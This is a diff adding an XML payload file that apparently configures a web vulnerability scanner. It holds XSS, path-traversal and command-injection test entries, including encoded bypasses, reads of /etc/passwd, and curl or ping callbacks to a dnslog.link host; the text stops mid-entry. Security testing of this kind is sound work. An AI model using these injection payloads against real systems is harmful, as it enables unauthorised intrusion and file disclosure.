@@ -1,0 +1,1074 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+	<!-- General RXSS payload -->
+	<test>
+		<title>RXSS [Payload] [<![CDATA['"><script>document.title="[random]";</script>]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA['"><script>document.title="[random]";</script>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<!--Leak in html RXSS payload-->
+	<test>
+		<title>RXSS [Payload] [<![CDATA[<script>document.title="[random]";</script>]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<script>document.title="[random]";</script>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[<svg onload=document.title="[random]">]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<svg onload=document.title="[random]">]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<!--Leak in js RXSS payload-->
+	<test>
+		<title>RXSS [Payload] [<![CDATA[document.title='[random]';//]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[document.title='[random]';//]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[";document.title="[random]";//]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[";document.title="[random]";//]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[';document.title="[random]";//]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[';document.title="[random]";//]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[");document.title="[random]";//]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[");document.title="[random]";//]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[');document.title="[random]";//]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[');document.title="[random]";//]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS</info>
+		</details>
+	</test>
+	<!--Leak in html attribute RXSS payload-->
+	<test>
+		<title>RXSS [Payload] [<![CDATA[888" onload=document.title="[random]" a="]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[888" onload=document.title="[random]" a="]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+			<level>3</level>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS!</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[888' onload=document.title="[random]" a=']]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[888' onload=document.title="[random]" a=']]></payload>
+		</request>
+		<response>
+			<grep></grep>
+			<level>3</level>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS!</info>
+		</details>
+	</test>
+	<test>
+		<title>RXSS [Payload] [<![CDATA[888 onload=document.title="[random]" ]]>]</title>
+		<stype>T</stype>
+		<tech>3</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[888 onload=document.title="[random]" a=]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+			<level>3</level>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>RXSS!</info>
+		</details>
+	</test>
+
+	<!--SXSS payload-->
+	<!--General SXSS payload-->
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<script>alert(/StoredXssByScriptTag/);</script>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<script>alert(/StoredXssByScriptTag/);</script>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>SXSS [Payload] [<![CDATA["'><script>alert(/StoredXssByScriptTagBypass/);</script>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA["'><script>alert(/StoredXssByScriptTagBypass/);</script>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS XSS!</info>
+		</details>
+	</test>
+	<!--Bypass on event -->
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<svg onload=alert(/StoredXssBySvgTag/)>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<svg onload=alert(/StoredXssBySvgTag/)>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<!--Bypass pseudo protocol-->
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<iframe src=javascript:prompt(/StoredXssByIframeTag/);></iframe>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<iframe src=javascript:prompt(/StoredXssByIframeTag/);></iframe>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+></object>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+></object>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<!--Bypass html5 tag-->
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<svg onload=prompt(/StoredXssBySvgTag/)>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<svg onload=prompt(/StoredXssBySvgTag/)>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<!--Bypass html or js encode -->
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<embed src=javas&#99;r&#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<embed src=javas&#99;r&#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<video><source onerror=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<video><source onerror=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<test>
+		<title>SXSS [Payload] [<![CDATA[<script/src=data&colon;text/j\141v\141&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)></script>]]>]</title>
+		<stype>T</stype>
+		<tech>2</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[<script/src=data&colon;text/j\141v\141&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)></script>]]></payload>
+		</request>
+		<response>
+			<grep></grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>SXSS</info>
+		</details>
+	</test>
+	<!--TRAV-->
+	<!-- General payload -->
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/hosts]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/hosts]]></payload>
+		</request>
+		<response>
+			<grep>127.0.0.1</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<!--TRAV bypass-->
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/././././././././././../../../../../../../../etc/passwd]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/././././././././././../../../../../../../../etc/passwd]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts]]></payload>
+		</request>
+		<response>
+			<grep>127.0.0.1</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<!--TRAV bypass by Suffix-->
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd#]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd#]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd%00]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd%00]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd#.jpg]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd#.jpg]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd%00.jpg]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd%00.jpg]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd#.html]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd#.html]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../../../../../etc/passwd%00.html]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../../../../../etc/passwd%00.html]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+		<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html]]></payload>
+		</request>
+		<response>
+			<grep>/bin/bash</grep>
+		</response>
+		<details>
+			<versions>linux</versions>
+			<info>TRAV</info>
+		</details>
+	</test>
+	<test>
+		<title>TRAV [PAYLOAD] [<![CDATA[/../../../../../../../C:/Windows/system.ini]]>]</title>
+		<stype>T</stype>
+		<tech>1</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[/../../../../../../../C:/Windows/system.ini]]></payload>
+		</request>
+		<response>
+			<grep>drivers</grep>
+		</response>
+		<details>
+			<versions>Windows</versions>
+			<info>File Travelsal</info>
+		</details>
+	</test>
+	<!--OSCI payload-->
+	<!-- General payload -->
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[curl [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[curl [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux,windows</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ | curl [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[ | curl [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux,windows</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[;curl [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[;curl [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux,Windows</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ | ping -n 2 [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[ | ping -n 2 [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Windows</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ping -n 2 [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[ping -n 2 [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Windows</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ping -c 2 [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[ping -c 2 [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ | ping -c 2 [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[ | ping -c 2 [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<!--OSCI Bypass payload -->
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[;curl [random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[;curl [random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[curl [random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[curl [random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ | curl [random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[ | curl [random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[curl%20[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[curl%20[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[%20|%20curl%20[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[%20|%20curl%20[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[%20|%20curl%20[random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[%20|%20curl%20[random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[ping%20-n%202%20[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[ping%20-n%202%20[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[%20|%20ping%20-n%202%20[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[%20|%20ping%20-n%202%20[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[%20|%20ping%20-c%202%20[random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[%20|%20ping%20-c%202%20[random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[a=c;b=url;$a$b [random].test.dnslog.link#]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[a=c;b=url;$a$b [random].test.dnslog.link#]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[curl${IFS}[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level2</level>
+		<request>
+			<payload><![CDATA[curl${IFS}[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
+			<info>Command Exec</info>
+		</details>
+	</test>
+	<test>
+		<title>OSCI [PAYLOAD] [<![CDATA[${IFS}|${IFS}curl${IFS}[random].test.dnslog.link]]>]</title>
+		<stype>T</stype>
+		<tech>4</tech>
+		<level>level1</level>
+		<request>
+			<payload><![CDATA[${IFS}|${IFS}curl${IFS}[random].test.dnslog.link]]></payload>
+		</request>
+		<response>
+			<url>http://admin.dnslog.link/api/dns/test/[random]/</url>
+			<grep>True</grep>
+		</response>
+		<details>
+			<versions>Linux</versions>
